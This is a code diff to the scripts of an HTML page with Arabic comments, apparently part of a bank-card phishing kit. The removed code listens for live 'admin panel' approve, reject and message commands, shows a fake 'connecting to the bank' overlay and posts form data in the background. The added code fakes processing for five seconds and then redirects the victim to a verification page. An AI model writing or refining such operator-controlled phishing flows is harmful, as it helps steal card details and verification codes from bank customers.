@@ -2748,69 +2748,34 @@ document.addEventListener('DOMContentLoaded', function() {
 
 </script>
 <script>
-// ═══ الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسالة) ═══
-(function () {
-  function showAdminOverlay(text, color) {
-    var ov = document.createElement('div');
-    ov.style.cssText = 'position:fixed;inset:0;background:rgba(255,255,255,.97);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:20px;';
-    ov.innerHTML = '<div style="font-size:22px;font-weight:700;color:' + color + ';">' + text + '</div>';
-    document.body.appendChild(ov);
-  }
-  if (typeof window.listenForAdminCommands === 'function') {
-    window.listenForAdminCommands({
-      onApproval: function () { window.location.href = 'verification.html'; },
-      onRejection: function (cmd) {
-        // إخفاء شاشة "جار الاتصال بالبنك" لتظهر رسالة الرفض
-        var bankOverlay = document.getElementById('bankConnectingOverlay');
-        if (bankOverlay) { bankOverlay.remove(); }
-        // إعادة إظهار أزرار الإرسال/الإلغاء (أُخفيت عند الإرسال)
-        var i41 = document.getElementById('i41');
-        if (i41) { i41.style.display = ''; }
-        // إظهار رسالة الرفض فوق بوكس الحقول من الأعلى
-        var notice = document.getElementById('rejectionNotice');
-        if (notice) { notice.style.display = 'block'; }
-        // التمرير لأعلى الصفحة لرؤية الرسالة
-        try { window.scrollTo({ top: 0, behavior: 'smooth' }); } catch (e) { window.scrollTo(0, 0); }
-      },
-      onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
-    });
-  }
-})();
+// حل مشكلة Firebase لمنع أي خطأ في الصفحة
+if (typeof window.initFirebaseSession !== 'function') {
+  window.initFirebaseSession = function() {};
+}
 
-	</script>
-
-	
-
-<script>
+// تعديل دالة الضغط على زر الإرسال (v40)
 function v40() {
-  const sendBtn = document.getElementById('i41');
-  const form = sendBtn ? sendBtn.closest('form') : null;
-
-  if (!form) {
-    alert('لم يتم العثور على النموذج!');
-    return;
-  }
-
-  // 1. تعطيل الزر وتغيير النص ليعرف العميل أنه جاري الإرسال
+  var sendBtn = document.getElementById('i41');
+  
+  // 1. تغيير نص الزر وتعطيله لمنع التكرار
   if (sendBtn) {
     sendBtn.disabled = true;
     sendBtn.innerText = 'جاري المعالجة...';
   }
 
-  // 2. تجميع البيانات وإرسالها في الخلفية
-  const formData = new FormData(form);
-  const xhr = new XMLHttpRequest();
-  
-  // يرسل البيانات لنفس رابط action الخاص بالنموذج
-  xhr.open(form.method || 'POST', form.action || window.location.href, true);
-  
-  xhr.send(formData);
+  // 2. إظهار شاشة الانتظار (إذا كانت موجودة في صفحتك)
+  var bankOverlay = document.getElementById('bankConnectingOverlay');
+  if (bankOverlay) {
+    bankOverlay.style.display = 'flex';
+  }
 
-  // 3. بدء عداد الـ 5 ثوانٍ للتوجيه (بغض النظر عن طريقة استجابة السيرفر)
+  // 3. التوجيه التلقائي إلى صفحة التأكيد بعد 5 ثوانٍ
   setTimeout(function() {
-    window.location.href = 'verification.html'; // <<< ضع رابط صفحتك الجديدة هنا
+    window.location.href = 'verification.html';
   }, 5000);
 }
 </script>
+
+	
 </body>
 </html>
